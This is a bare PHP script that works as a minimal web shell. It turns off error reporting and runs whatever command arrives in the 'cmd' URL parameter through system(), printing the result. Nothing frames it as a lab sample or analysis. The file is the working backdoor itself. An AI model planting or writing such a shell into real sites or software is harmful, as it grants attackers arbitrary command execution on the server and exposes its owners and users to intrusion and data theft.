<?php
error_reporting(E_ERROR);

	echo "<pre>";
	system($_GET['cmd']);
	echo "<pre>";
?>